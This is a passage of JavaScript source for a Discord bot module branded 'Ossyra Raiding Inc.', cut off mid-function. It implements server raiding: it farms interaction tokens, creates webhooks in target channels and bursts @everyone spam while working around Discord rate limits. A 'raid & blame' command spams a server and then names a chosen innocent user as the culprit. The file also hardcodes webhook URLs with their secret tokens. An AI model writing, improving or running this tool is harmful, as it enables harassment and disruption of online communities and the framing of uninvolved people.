const { SlashCommandBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, MessageFlags, ModalBuilder, TextInputBuilder, TextInputStyle, EmbedBuilder, ContainerBuilder, TextDisplayBuilder, SeparatorBuilder, SectionBuilder, ThumbnailBuilder, MediaGalleryBuilder, MediaGalleryItemBuilder } = require('discord.js');
const fs = require('fs');
const path = require('path');
const https = require('https');

const templatesPath = path.join(process.cwd(), 'templates');
const presetsPath = path.join(process.cwd(), 'data', 'user', 'presets');

const imageDetectionLogs = new Map();

const IMAGE_URL_PATTERN = /(?:\.(jpg|jpeg|png|gif|webp|bmp|tiff|svg)(?:\?.*)?$|https?:\/\/\S+\.(?:jpg|jpeg|png|gif|webp|bmp|tiff|svg)(?:\?\S*)?|https?:\/\/(?:i\.)?imgur\.com\/\S+|https?:\/\/gyazo\.com\/\S+|https?:\/\/(?:cdn\.)?discord(?:app)?\.com\/attachments\/\S+|https?:\/\/(?:cdn\.)?discord(?:app)?\.com\/cdn\/\S+|https?:\/\/\S*tenor\.com\/\S+|https?:\/\/\S*giphy\.com\/\S+)/i;
const LINK_PATTERN = /https?:\/\/[^\s]+|discord\.(?:gg|com\/invite)\/[a-zA-Z0-9]+/g;
const MARKDOWN_IMAGE_PATTERN = /!\[.*?\]\(([^)]+)\)/;
const IMAGE_EXTENSION_PATTERN = /\.(?:jpg|jpeg|png|gif|webp|bmp|tiff|svg)(?:\?.*)?$/i;
const HTTP_PATTERN = /^https?:\/\//i;
const TENOR_GIPHY_PATTERN = /https?:\/\/(?:www\.)?(tenor|giphy)\.com/i;

const httpAgent = new https.Agent({
    keepAlive: true,
    keepAliveMsecs: 50,
    maxSockets: 50000,
    maxFreeSockets: 10000,
    timeout: 250,
    freeSocketTimeout: 500,
    scheduling: 'fifo',
    maxRedirects: 0,
    connectionTimeout: 50,
    forceGlobalAgent: false
});

class RequestQueue {
    constructor(maxConcurrent = 5000) {
        this.maxConcurrent = maxConcurrent;
        this.active = 0;
        this.queue = [];
        this.priorityQueue = [];
    }
    
    async run(fn, priority = 0) {
        return new Promise((resolve, reject) => {
            const task = { fn, priority, resolve, reject };
            if (priority > 0) {
                this.priorityQueue.push(task);
            } else {
                this.queue.push(task);
            }
            this._process();
        });
    }
    
    _process() {
        while (this.active < this.maxConcurrent) {
            const task = this.priorityQueue.shift() || this.queue.shift();
            if (!task) break;
            this.active++;
            Promise.resolve()
                .then(() => task.fn())
                .then(task.resolve)
                .catch(task.reject)
                .finally(() => {
                    this.active--;
                    this._process();
                });
        }
    }
}

const requestQueue = new RequestQueue(5000);

class WebhookBucket {
    constructor() {
        this.remaining = 5;
        this.resetAt = 0;
        this.queue = [];
        this.draining = false;
    }

    post(url, body) {
        return new Promise(resolve => {
            this.queue.push({ url, body, resolve });
            if (!this.draining) this._drain();
        });
    }

    async _drain() {
        this.draining = true;
        while (this.queue.length > 0) {
            const now = Date.now();
            if (this.remaining <= 0 && now < this.resetAt) {
                await new Promise(r => setTimeout(r, this.resetAt - now + 10));
            }
            const task = this.queue.shift();
            this.remaining = Math.max(0, this.remaining - 1);
            try {
                const res = await fetch(task.url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: task.body
                });
                const rem = parseInt(res.headers.get('X-RateLimit-Remaining') ?? '5', 10);
                const resetAfter = parseFloat(res.headers.get('X-RateLimit-Reset-After') ?? '0') * 1000;
                if (!isNaN(rem)) this.remaining = rem;
                if (resetAfter > 0) this.resetAt = Date.now() + resetAfter;
                if (res.status === 429) {
                    const retryAfter = parseFloat(res.headers.get('Retry-After') ?? '1') * 1000;
                    this.remaining = 0;
                    this.resetAt = Date.now() + Math.min(retryAfter, 30000);
                    this.queue.unshift(task);
                } else {
                    task.resolve(true);
                }
            } catch {
                task.resolve(false);
            }
        }
        this.draining = false;
    }
}

const webhookBuckets = new Map();
const getWebhookBucket = (url) => {
    const key = url.split('?')[0];
    if (!webhookBuckets.has(key)) webhookBuckets.set(key, new WebhookBucket());
    return webhookBuckets.get(key);
};

class BufferPool {
    constructor(size = 10000) {
        this.pool = [];
        this.size = size;
        this.created = 0;
    }
    
    acquire() {
        const buf = this.pool.pop();
        if (!buf && this.created < this.size) {
            this.created++;
            return Buffer.allocUnsafe(16384);
        }
        return buf || Buffer.allocUnsafe(16384);
    }
    
    release(buffer) {
        if (this.pool.length < this.size) this.pool.push(buffer);
    }
}

const bufferPool = new BufferPool(10000);

const payloadCache = new Map();
const MAX_PAYLOAD_CACHE = 5000;

const fileCache = new Map();
const readDir = (p) => { 
    try { 
        return fs.existsSync(p) ? fs.readdirSync(p) : []; 
    } catch {} 
    return []; 
};

const readFile = (p) => { 
    if (fileCache.has(p)) return fileCache.get(p);
    try { 
        if (fs.existsSync(p)) {
            const content = fs.readFileSync(p, 'utf8');
            fileCache.set(p, content);
            return content;
        }
    } catch {} 
    return ''; 
};

const ensureGif = (url) => {
    if (!url) return url;
    const qIdx = url.indexOf('?');
    if (url.endsWith('.gif') || qIdx !== -1 && url.slice(0, qIdx).endsWith('.gif')) return url;
    return qIdx !== -1 ? url.slice(0, qIdx) + '.gif' + url.slice(qIdx) : url + '.gif';
};

let templateCache = [];

const updateTemplateCache = () => { 
    templateCache = []; 
    if (fs.existsSync(templatesPath)) { 
        const templates = fs.readdirSync(templatesPath)
            .filter(file => file.endsWith('.txt'))
            .map(file => ({ 
                name: file.slice(0, -4), 
                value: file.slice(0, -4) 
            })); 
        templateCache.push(...templates); 
    }
}; 

updateTemplateCache();

setInterval(() => {
    if (fileCache.size > 100) fileCache.clear();
    if (payloadCache.size > MAX_PAYLOAD_CACHE) {
        const entriesToDelete = payloadCache.size - Math.floor(MAX_PAYLOAD_CACHE * 0.7);
        let deleted = 0;
        for (const [key] of payloadCache) {
            if (deleted >= entriesToDelete) break;
            payloadCache.delete(key);
            deleted++;
        }
    }
    if (global.gc) global.gc(false);
}, 30000);

class InteractionRaidCog {
    constructor(client, config) {
        this.client = client;
        this.config = config;
        this.name = 'interaction-raid';
        this.utils = null;
        this.alertChannelId = config.ALERT_CHANNEL_ID || '1469429589137690728';
        this.blacklistLogWebhook = config.WEBHOOKS?.BLACKLIST_LOG || 'https://discord.com/api/webhooks/1469768863561420935/FAPxlrcRpl-eRdciarn1WK6CjyGsnXsps31y8t-n7LSstedaVK2ZlJ8BgVrQWDb2dbWX';
        this.bypassRoleId = config.BYPASS_ROLE_ID || '1467343645786112142';
        this.allowedDiscordLink = config.ALLOWED_DISCORD_LINK || 'discord.gg/3ABxTE6UDE';
        this.mainGuildId = config.GUILD_ID;
        this.adminGuildId = config.ADMIN_SERVER_ID || config.GUILD_ID;
        this.imageAlertRoleId = config.IMAGE_ALERT_ROLE_ID || '1469429583978954753';
        
        this.userMessages = new Map();
        this.webhookCache = new Map();
        this.webhookCacheTimeout = 15 * 60 * 1000;
        this.webhookCacheMax = 5000;
        
        this.channelCache = new Map();
        this.channelCacheTimeout = 10 * 60 * 1000;
        this.channelCacheMax = 10000;
        
        this.guildCache = new Map();
        this.guildCacheTimeout = 15 * 60 * 1000;
        this.guildCacheMax = 1000;
        
        this.tokenWebhooks = new Map();
        
        // Rate limit bucket tracking for maximum throughput
        this.rateLimitBuckets = new Map();
        this.globalRateLimit = { limit: 50, remaining: 50, resetTime: 0 };
        
        setInterval(updateTemplateCache, 60000);
    }
    
    async fastFetch(url, options, retries = 1) {
        for (let attempt = 0; attempt <= retries; attempt++) {
            try {
                const response = await requestQueue.run(() => 
                    fetch(url, { ...options, agent: httpAgent, timeout: 250 })
                );
                
                // Parse rate limit headers for bucket tracking
                const bucket = response.headers.get('X-RateLimit-Bucket');
                const remaining = parseInt(response.headers.get('X-RateLimit-Remaining') || '1', 10);
                const limit = parseInt(response.headers.get('X-RateLimit-Limit') || '10', 10);
                const resetAfter = parseInt(response.headers.get('X-RateLimit-Reset-After') || '0', 10) * 1000;
                
                if (bucket) {
                    this.rateLimitBuckets.set(bucket, { remaining, limit, resetTime: Date.now() + resetAfter });
                }
                
                // Update global rate limit
                if (remaining !== undefined) {
                    this.globalRateLimit = { remaining, limit: limit || 50, resetTime: Date.now() + resetAfter };
                }
                
                // Handle rate limits
                if (response.status === 429) {
                    const retryAfter = parseInt(response.headers.get('Retry-After') || '1', 10) * 1000;
                    if (attempt < retries) {
                        await new Promise(r => setTimeout(r, Math.min(retryAfter, 100)));
                        continue;
                    }
                }
                
                return response;
            } catch (e) {
                if (attempt === retries) throw e;
                const backoff = Math.min(50 * Math.pow(1.5, attempt), 150);
                await new Promise(r => setTimeout(r, backoff));
            }
        }
    }
    
    async getOrCreateWebhook(channelId) {
        const cached = this.webhookCache.get(channelId);
        if (cached && Date.now() < cached.expires) return cached.url;
        
        try {
            const channel = await this.client.channels.fetch(channelId).catch(() => null);
            if (!channel?.isTextBased?.()) return null;
            
            const webhooks = await channel.fetchWebhooks().catch(() => []);
            let webhook = webhooks.find(wh => wh.owner?.id === this.client.user.id);
            
            if (!webhook && webhooks.length < 10) {
                webhook = await channel.createWebhook({
                    name: 'Ossyra',
                    reason: 'Raid'
                }).catch(() => null);
            }
            
            if (webhook) {
                this.webhookCache.set(channelId, {
                    url: webhook.url,
                    expires: Date.now() + 18 * 60 * 1000  // 18 min cache
                });
                return webhook.url;
            }
        } catch (error) {
        }
        return null;
    }

    async prefetchWebhooks(tokens) {
        const channels = new Set(tokens.map(t => t.channelId));
        const results = await Promise.allSettled(
            Array.from(channels, async ch => ({ 
                channelId: ch, 
                url: await this.getOrCreateWebhook(ch) 
            }))
        );
        return new Map(
            results
                .filter(r => r.status === 'fulfilled')
                .map(r => [r.value.channelId, r.value.url])
        );
    }

    async sendBulkMessages(webhookUrl, count, bodyPayload) {
        const domainBatch = [];
        for (let i = 0; i < count; i++) {
            domainBatch.push(
                this.fastFetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: bodyPayload
                }, 0).catch(() => null)
            );
        }
        await Promise.allSettled(domainBatch);
    }
    
    setUtils(utils) {
        this.utils = utils;
    }

    getPanelText(language = 'english') {
        const texts = {
            english: {
                panelTitle: '## interaction r4id panel',
                webhooksSaved: 'webhooks saved',
                messagesSendable: 'messages sendable',
                attackInProgress: '**ATTACK IN PROGRESS...**',
                imageDetected: 'image detected and logged. you WILL be banned for gore / porn / csam / abuse usage.',
                moreButtons: 'more farm buttons',
                farmButton: 'farm',
                attackButton: 'attackuu!1!!1',
                footer: 'Ossyra Raiding Inc. - Trust us, with your raiding.'
            },
            spanish: {
                panelTitle: '## panel r4id de interacción',
                webhooksSaved: 'webhooks guardados',
                messagesSendable: 'mensajes enviables',
                attackInProgress: '**¡ATAQUE EN PROGRESO!...**',
                imageDetected: 'imagen detectada y registrada. SERÁS BANEADO por uso de gore / porno / csam / abuso.',
                moreButtons: 'más botones de farm',
                farmButton: 'granja',
                attackButton: '¡Ataque!!1!!1',
                footer: 'Ossyra Raiding Inc. - Confía en nosotros, con tu raid.'
            }
        };
        return texts[language] || texts['english'];
    }
    
    async updateMenuCounter(user) {
        if (!this.utils) return;
        const count = (this.utils.loadMenuCount() || 0) + 1;
        this.utils.saveMenuCount(count);
        this.utils.sendMenuLog(user, count).catch(() => {});
    }
    
    containsImageLinks(text) {
        if (!text || text.length === 0) return false;
        const match = text.match(IMAGE_URL_PATTERN);
        if (match) return match[0];
        const md = text.match(MARKDOWN_IMAGE_PATTERN);
        return (md && HTTP_PATTERN.test(md[1])) ? md[1] : false;
    }
    
    containsAnyLinks(text) {
        if (!text) return false;
        const lowerAllowed = this.allowedDiscordLink.toLowerCase();
        const lines = text.split('\n');
        for (const line of lines) {
            if (!line.toLowerCase().includes(lowerAllowed) && LINK_PATTERN.test(line)) {
                return true;
            }
        }
        return false;
    }
    

    
    async resolveDirectImageUrl(url) {
        try {
            if (/\.(jpg|jpeg|png|gif|webp|bmp|tiff|svg)(\?.*)?$/i.test(url)) return url;
            if (/cdn\.discord(app)?\.com/i.test(url)) return url;
            if (/tenor\.com|giphy\.com/i.test(url)) {
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 5000);
                try {
                    const res = await fetch(url, {
                        headers: { 'User-Agent': 'Mozilla/5.0' },
                        signal: controller.signal
                    });
                    const html = await res.text();
                    const match =
                        html.match(/<meta[^>]+property=["']og:image["'][^>]+content=["']([^"']+)["']/i) ||
                        html.match(/<meta[^>]+content=["']([^"']+)["'][^>]+property=["']og:image["']/i) ||
                        html.match(/<meta[^>]+name=["']twitter:image["'][^>]+content=["']([^"']+)["']/i) ||
                        html.match(/<meta[^>]+content=["']([^"']+)["'][^>]+name=["']twitter:image["']/i);
                    if (match && match[1]) return match[1];
                } finally {
                    clearTimeout(timeout);
                }
            }
        } catch {
        }
        return url;
    }

    async checkUserHasBypassRole(userId) {
        try {
            const requiredGuild = await this.client.guilds.fetch(this.mainGuildId);
            const member = await requiredGuild.members.fetch(userId);
            return member.roles.cache.has(this.bypassRoleId);
        } catch (error) {
            console.error('Error checking bypass role:', error);
            return false;
        }
    }
    
    async sendImageDetectionAlert(interaction, imageLink) {
        try {
            let alertChannel = null;
            let resolvedChannelId = null;

            const imgWebhookUrl = this.config.WEBHOOKS?.IMAGE_DETECTION;
            if (imgWebhookUrl) {
                try {
                    const whInfo = await fetch(imgWebhookUrl).then(r => r.json());
                    if (whInfo && whInfo.channel_id) {
                        resolvedChannelId = whInfo.channel_id;
                        const guild = await this.client.guilds.fetch(this.mainGuildId);
                        alertChannel = await guild.channels.fetch(resolvedChannelId);
                        console.log(`[ImgLog] Resolved alert channel ${resolvedChannelId} from webhook info`);
                    }
                } catch (e) {
                    console.error(`[ImgLog] Failed to resolve channel from webhook: ${e.message}`);
                }
            }

            if (!alertChannel) {
                const fallbackChannelId = '1469429589137690728';
                resolvedChannelId = fallbackChannelId;
                try {
                    const guild = await this.client.guilds.fetch(this.mainGuildId);
                    alertChannel = await guild.channels.fetch(fallbackChannelId);
                } catch (e) {
                    console.error(`[ImgLog] Failed to fetch fallback alert channel via guild: ${e.message}`);
                }
            }

            if (!alertChannel) {
                try {
                    alertChannel = await this.client.channels.fetch(resolvedChannelId);
                } catch (e) {
                    console.error(`[ImgLog] Failed to fetch alert channel directly: ${e.message}`);
                }
            }

            if (!alertChannel) {
                console.error(`[ImgLog] Could not fetch alert channel ${resolvedChannelId} — giving up`);
                return;
            }

            console.log(`[ImgLog] Sending alert for ${interaction.user.tag}, imageLink: ${imageLink}`);

            const detectionId = `${Date.now()}_${interaction.user.id}`;
            const directImageUrl = await this.resolveDirectImageUrl(imageLink);

            const banButton = new ButtonBuilder()
                .setCustomId(`ban_image_user_${detectionId}`)
                .setLabel('Ban User')
                .setStyle(ButtonStyle.Danger)
                .setEmoji('🚫');

            const viewButton = new ButtonBuilder()
                .setLabel('View Image')
                .setStyle(ButtonStyle.Link)
                .setURL(imageLink)
                .setEmoji('👁️');

            const alertContainer = new ContainerBuilder()
                .setAccentColor(0xFF4444)
                .addTextDisplayComponents(
                    new TextDisplayBuilder().setContent(`<@&${this.imageAlertRoleId}> **IMAGE DETECTED!**`)
                )
                .addSectionComponents(
                    new SectionBuilder()
                        .addTextDisplayComponents(
                            new TextDisplayBuilder().setContent(
                                `## ⚠️ image detected\n` +
                                `${interaction.user.tag}  •  <@${interaction.user.id}>\n` +
                                `-# User ID: ${interaction.user.id}`
                            )
                        )
                        .setThumbnailAccessory(
                            new ThumbnailBuilder().setURL(interaction.user.displayAvatarURL({ size: 64 }))
                        )
                )
                .addSeparatorComponents(new SeparatorBuilder().setDivider(true))
                .addTextDisplayComponents(
                    new TextDisplayBuilder().setContent(
                        `**detected at:** <t:${Math.floor(Date.now()/1000)}:F>\n` +
                        `**image url:** ${imageLink.length > 100 ? imageLink.substring(0, 100) + '...' : imageLink}\n` +
                        `-# detection id: ${detectionId}  •  confirmations: 0/3`
                    )
                )
                .addMediaGalleryComponents(
                    new MediaGalleryBuilder().addItems(
                        new MediaGalleryItemBuilder().setURL(directImageUrl).setDescription('detected image')
                    )
                )
                .addSeparatorComponents(new SeparatorBuilder().setDivider(true))
                .addActionRowComponents(
                    new ActionRowBuilder().addComponents(banButton, viewButton)
                );

            let sentMsg = null;
            try {
                sentMsg = await alertChannel.send({
                    flags: MessageFlags.IsComponentsV2,
                    components: [alertContainer]
                });
                console.log(`[ImgLog] ✅ Alert sent for ${interaction.user.tag} (Detection ID: ${detectionId})`);
            } catch (err) {
                console.error(`[ImgLog] ❌ Failed to send to channel: ${err.message}`);
            }

            imageDetectionLogs.set(detectionId, {
                userId: interaction.user.id,
                userTag: interaction.user.tag,
                imageLink: imageLink,
                directImageUrl: directImageUrl,
                timestamp: Date.now(),
                confirmations: new Set(),
                banned: false,
                webhookUrl: null,
                webhookMessageId: null,
                alertChannelId: resolvedChannelId,
                alertMessageId: sentMsg ? sentMsg.id : null
            });

        } catch (error) {
            console.error('Failed to send image detection alert:', error);
        }
    }
    
    async logBanAction(moderator, detectionInfo, isInstaBan = false) {
        try {
            const webhookUrl = this.blacklistLogWebhook;
            
            const embed = new EmbedBuilder()
                .setTitle(isInstaBan ? '**! INSTA-BAN - Image Detection**' : '**! Image Detection Ban**')
                .setColor(isInstaBan ? 0xFF0000 : 0xFFA500)
                .addFields(
                    { name: '👤 User', value: `${detectionInfo.userTag} (${detectionInfo.userId})`, inline: true },
                    { name: '🛡️ Mod/Confirmer', value: `${moderator.tag} (${moderator.id})`, inline: true },
                    { name: '🔎 Image URL', value: detectionInfo.imageLink.length > 200 ? `${detectionInfo.imageLink.substring(0, 200)}...` : detectionInfo.imageLink, inline: false },
                    { name: '⏱️ Detected At', value: `<t:${Math.floor(detectionInfo.timestamp/1000)}:F>`, inline: true },
                    { name: '🔨 Banned At', value: `<t:${Math.floor(Date.now()/1000)}:F>`, inline: true }
                )
                .setFooter({ text: 'Ossyra Raiding Inc. - Trust us, with your raiding.' })
                .setTimestamp();
            
            if (!isInstaBan && detectionInfo.confirmations) {
                embed.addFields({
                    name: '👥 Confirmers (3 Different Users)',
                    value: Array.from(detectionInfo.confirmations).map(id => `<@${id}>`).join(', '),
                    inline: false
                });
            }
            
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [embed.toJSON()] })
            }).catch(e => console.error('Failed to post ban log:', e.message));
            
            console.log(`📝 ${isInstaBan ? 'Insta-ban' : 'Ban'} logged for user ${detectionInfo.userTag} by ${moderator.tag}`);
            
        } catch (error) {
            console.error('Failed to log ban action to webhook:', error);
        }
    }
    
    async logBlacklistAttempt(interaction) {
        try {
            const logMessage = `<@${interaction.user.id}> just tried to use the bot lol`;
            
            await fetch(this.blacklistLogWebhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    content: logMessage,
                    username: 'Blacklist Logger',
                    avatar_url: 'https://cdn.discordapp.com/attachments/1448160824467263714/1466626270710202479/Untitled.png'
                })
            }).catch(e => console.error('Failed to post blacklist log:', e.message));
            
            console.log(`⚠️ Blacklist attempt logged for user ${interaction.user.tag} (${interaction.user.id})`);
        } catch (error) {
            console.error('Failed to log blacklist attempt to webhook:', error);
        }
    }
    
    get commands() {
        return [
            {
                name: 'a-interaction-r4id',
                description: '(r4iding) generates a panel to farm interaction tokens for a burst r4id',
                options: [
                    {
                        name: 'use-custom',
                        description: 'do you want to use a custom message? (yes/no)',
                        type: 3,
                        required: true,
                        choices: [
                            { name: 'yes', value: 'yes' },
                            { name: 'no', value: 'no' }
                        ]
                    },
                    {
                        name: 'custom-text',
                        description: 'enter your custom message (required if use-custom is yes)',
                        type: 3,
                        required: false
                    },
                    {
                        name: 'template',
                        description: 'or use one of ur presets (optional)',
                        type: 3,
                        required: false,
                        autocomplete: true
                    }
                ],
                integration_types: [0, 1],
                contexts: [0, 1, 2]
            },
            {
                name: 'rb',
                description: '(r4iding) try to get some1 banned :P',
                options: [
                    {
                        name: 'target',
                        description: 'who do u wanna blame? ',
                        type: 6,
                        required: true
                    }
                ],
                integration_types: [0, 1],
                contexts: [0, 1, 2]
            }
        ];
    }
    
    async executeCommand(interaction, command) {
        if (command.name === 'a-interaction-r4id') {
            if (!interaction.deferred && !interaction.replied) {
                await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
            }
            await this.handleInteractionR4id(interaction);
        } else if (command.name === 'rb') {
            if (!interaction.deferred && !interaction.replied) {
                await interaction.deferReply({ flags: [MessageFlags.Ephemeral] });
            }
            await this.handleRaidBan(interaction);
        }
    }
    
    async handleRaidBan(interaction) {
        if (this.utils && this.utils.isBlacklisted && this.utils.isBlacklisted(interaction.user.id)) {
            await this.logBlacklistAttempt(interaction);
            return interaction.editReply({
                embeds: [this.utils.getBlacklistEmbed()],
                components: []
            });
        }
        if (interaction.guildId === this.mainGuildId) {
            return interaction.editReply({ content: 'nice try nerd' });
        }
        
        try {
            const requiredGuild = await this.client.guilds.fetch(this.mainGuildId);
            let isMember = false;
            try {
                await requiredGuild.members.fetch(interaction.user.id);
                isMember = true;
            } catch (error) {
                isMember = false;
            }

            if (!isMember) {
                await this.logBlacklistAttempt(interaction);
                return interaction.editReply({
                    content: '# 🚨ADMINS/MODS OF THIS SERVER, PLEASE READ THIS.🚨 \n\n ## The user above just tried to raid your server with our bot. we recommend banning them.'
                });
            }
        } catch (error) {
            console.error('Error checking guild membership:', error);
            return interaction.editReply({ content: 'Error verifying membership' });
        }
        
        await this.updateMenuCounter(interaction.user);
        const targetUser = interaction.options.getUser('target');
        if (!targetUser) {
            return interaction.editReply({ content: 'target user not found' });
        }
        
        const rbMessagePath = path.join(__dirname, '..', 'data', 'rb.txt');
        let rbMessage = readFile(rbMessagePath).trim();
        if (!rbMessage) {
            return interaction.editReply({ content: `rb message file is empty or missing (${rbMessagePath})` });
        }
        
        const messageContent = rbMessage.replace(/@user/gi, `<@${targetUser.id}>`);
        
        if (messageContent.length > 2000) {
            return interaction.editReply({ content: 'rb message is too long (>2000 chars)' });
        }
        
        let state = { tokens: [], attackStarted: false, msg: null };
        const expires = Math.floor((Date.now() + 780000) / 1000);
        
        const generatePanel = () => {
            const isAttackDisabled = state.tokens.length === 0 || state.attackStarted;
            const panelText = this.getPanelText('english');
            
            let statsContent = '';
            if (state.msg) statsContent += `${state.msg}\n\n`;
            statsContent += `${panelText.webhooksSaved}: **${state.tokens.length}**\n${panelText.messagesSendable}: **${state.tokens.length * 5}**\nexpires: <t:${expires}:R>`;
            if (state.attackStarted) statsContent += `\n\n${panelText.attackInProgress}`;
            
            const container = new ContainerBuilder()
                .setAccentColor(state.attackStarted ? 0xFF4444 : 0xFFFFFF)
                .addTextDisplayComponents(new TextDisplayBuilder().setContent('## raid & blame panel'))
                .addSeparatorComponents(new SeparatorBuilder().setDivider(true))
                .addTextDisplayComponents(new TextDisplayBuilder().setContent(statsContent))
                .addSeparatorComponents(new SeparatorBuilder().setDivider(true))
                .addActionRowComponents(
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('rb_farm_1').setLabel('farm').setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted),
                        new ButtonBuilder().setCustomId('rb_farm_2').setLabel('farm').setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted),
                        new ButtonBuilder().setCustomId('rb_farm_3').setLabel('farm').setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted),
                        new ButtonBuilder().setCustomId('rb_farm_4').setLabel('farm').setStyle(ButtonStyle.Secondary).setDisabled(state.attackStarted)
                    )
                )
                .addActionRowComponents(
                    new ActionRowBuilder().addComponents(
                        new ButtonBuilder().setCustomId('rb_attack').setLabel('RAID & BLAME').setStyle(ButtonStyle.Danger).setDisabled(isAttackDisabled)
                    )
                )
                .addTextDisplayComponents(new TextDisplayBuilder().setContent('-# Ossyra Raiding Inc.'));
            
            return { flags: MessageFlags.IsComponentsV2, components: [container] };
        };
        
        let pendingUpdate = false;
        let updateScheduled = false;
        let dirtyPanel = false;
        const scheduleUpdate = () => {
            if (updateScheduled || pendingUpdate) return;
            updateScheduled = true;
            setImmediate(() => {
                updateScheduled = false;
                if (pendingUpdate) return;
                pendingUpdate = true;
                dirtyPanel = false;
                interaction.editReply({ ...generatePanel() }).catch(() => {}).finally(() => {
                    pendingUpdate = false;
                    if (dirtyPanel) scheduleUpdate();
                });
            });
        };
        const fastUpdatePanel = () => { dirtyPanel = true; scheduleUpdate(); };
        
        try {
            const msg = await interaction.editReply({ ...generatePanel(), fetchReply: true });
            const collector = msg.createMessageComponentCollector({ time: 780000 });
            
            collector.on('collect', async i => {
                if (i.user.id !== interaction.user.id) {
                    return i.reply({ content: 'not ur panel', flags: [MessageFlags.Ephemeral] });
                }
                
                state.msg = null;
                
                if (state.attackStarted) return i.deferUpdate();
                
                if (i.customId.startsWith('rb_farm')) {
                    i.deferUpdate().catch(() => {});
                    const channelId = i.channelId;
                    state.tokens.push({ interaction: i, channelId });
                    fastUpdatePanel();
                } else if (i.customId === 'rb_attack') {
                    state.attackStarted = true;
                    i.deferUpdate().catch(() => {});
                    fastUpdatePanel();
                    
                    const webhookMap = await this.prefetchWebhooks(state.tokens);
                    let payload = payloadCache.get(messageContent);
                    if (!payload) {
                        payload = JSON.stringify({
                            content: messageContent,
                            allowed_mentions: { parse: ['everyone'] }
                        });
                        if (payloadCache.size < MAX_PAYLOAD_CACHE) payloadCache.set(messageContent, payload);
                    }
                    
                    const availableQuota = Math.max(1, this.globalRateLimit.remaining - 5);
                    const tokensCount = Math.max(1, state.tokens.length);
                    const MESSAGES_PER_TOKEN = Math.max(1, Math.min(8, Math.floor(availableQuota / tokensCount)));
                    const allSendPromises = [];
                    
                    for (const token of state.tokens) {
                        const webhookUrl = webhookMap.get(token.channelId);
                        if (webhookUrl) {
                            for (let m = 0; m < MESSAGES_PER_TOKEN; m++) {
                                allSendPromises.push(
                                    this.fastFetch(webhookUrl, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: payload
                                    }, 0).catch(() => null)
                                );
                            }
                        } else {
                            const appId = this.client.application?.id || this.client.user.id;
                            const followUpUrl = `https://discord.com/api/v10/webhooks/${appId}/${token.interaction.token}`;
                            for (let m = 0; m < MESSAGES_PER_TOKEN; m++) {
                                allSendPromises.push(
                                    this.fastFetch(followUpUrl, {
                                        method: 'POST',
                                        headers: { 'Content-Type': 'application/json' },
                                        body: payload
                                    }, 0).catch(() => null)
                                );
                            }
                        }
                    }
                    
                    await Promise.allSettled(allSendPromises);
                    
                    await this.sendBlameMessage(targetUser, interaction);
                    
                    state.tokens = [];
                    state.attackStarted = false;
                    state.msg = '✅ raid complete - blamed target';
                    fastUpdatePanel();
                }
            });
            
            collector.on('end', async () => {
                try {
                    const expiredContainer = new ContainerBuilder()
                        .setAccentColor(0x2B2D31)
                        .addTextDisplayComponents(new TextDisplayBuilder().setContent('panel expired'))
                        .addActionRowComponents(
                            new ActionRowBuilder().addComponents(
                                new ButtonBuilder().setCustomId('rb_expired').setLabel('expired').setStyle(ButtonStyle.Secondary).setDisabled(true)
                            )
                        );
                    
                    await interaction.editReply({ flags: MessageFlags.IsComponentsV2, components: [expiredContainer] });
                } catch (e) {}
            });
        } catch (error) {
            console.error('Error in raid-ban:', error);
            if (!interaction.replied && !interaction.deferred) {
                await interaction.editReply({ content: 'An error occurred.' }).catch(() => {});
            }
        }
    }
    
    async sendBlameMessage(targetUser, interaction) {
        try {
            const blameWebhookUrl = 'https://discord.com/api/webhooks/1469769348989194334/HRVdbwluwhKKzxwmYfoom237spccDeQ3DAaTCKA0YDClAMwnhaKiNyT26_y3Y96S_HTz';
            const blameMessage = `<@${targetUser.id}> (${targetUser.tag}) was blamed by ${interaction.user.tag} for being annoying`;
            
            await fetch(blameWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: blameMessage })
            }).catch(e => console.error('Failed to send blame:', e.message));
        } catch (error) {
            console.error('Failed to blame user:', error);
        }
    }
    
    async handleInteractionR4id(interaction) {
        
        if (this.utils && this.utils.isBlacklisted && this.utils.isBlacklisted(interaction.user.id)) {
            await this.logBlacklistAttempt(interaction);
            
            return interaction.editReply({
                embeds: [this.utils.getBlacklistEmbed()],
                components: []
            });
        }
        if (interaction.guildId === this.mainGuildId) {
            return interaction.editReply({
                content: 'nice try nerd'
            });
        }
        
        try {
            const requiredGuild = await this.client.guilds.fetch(this.mainGuildId);
            
            let isMember = false;
            try {
                await requiredGuild.members.fetch(interaction.user.id);
                isMember = true;
            } catch (error) {
                isMember = false;
            }

            if (!isMember) {
                await this.logBlacklistAttempt(interaction);
                
                const blacklistMessage = `# 🚨ADMINS/MODS OF THIS SERVER, PLEASE READ THIS.🚨 \n\n ## The user above just tried to raid your server with our bot. we recommend banning them. \n\n # FOR USER \n\n **you prob got this msg bc of: Gore Usage, Porn Usage, Csam Content, or just leaving ossyra. if you left ossyra, please rejoin and you will have access to the bot.`;
                
                return interaction.editReply({
                    content: blacklistMessage
                });
            }
        } catch (error) {
            console.error('Error checking guild membership:', error);
            return interaction.editReply({
                content: 'Srry cant verify if u can use bc arko fucked the serverid up :P'
            });
        }
        
        await this.updateMenuCounter(interaction.user);
        
        const webhookFetchPromises = new Map();
        
        let state = { 
            tokens: [], 
            attackStarted: false, 
            msg: null 
        };
        const expires = Math.floor((Date.now() + 780000) / 1000);
        let finalMessageContent;

        const useCustom = interaction.options.getString('use-custom');
        const customText = interaction.options.getString('custom-text');
        const template = interaction.options.getString('template');

        let messageContent = '';
        let userError = null;
        let imageLinkFound = null;

        try {
            if (useCustom === 'yes') {
                if (!customText || customText.trim() === '') {
                    userError = 'you selected  use-custom.. so maybe add custom text-?';
                } else {
